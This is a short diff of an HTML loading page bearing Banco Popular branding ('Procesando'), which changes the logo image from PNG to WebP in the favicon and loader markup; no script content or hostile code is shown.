@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Procesando | Banco Popular</title>
-    <link rel="icon" type="image/png" href="popular_logo.png">
+    <link rel="icon" type="image/png" href="popular_logo.webp">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script type="text/javascript" src="../../scripts/functions2.js"></script>
@@ -152,7 +152,7 @@
 <body>
 
     <div class="loader-wrapper">
-        <img src="popular_logo.png" alt="Banco Popular" class="logo-banco">
+        <img src="popular_logo.webp" alt="Banco Popular" class="logo-banco">
         
         <div class="spinner-box">
             <div class="ripple"></div>
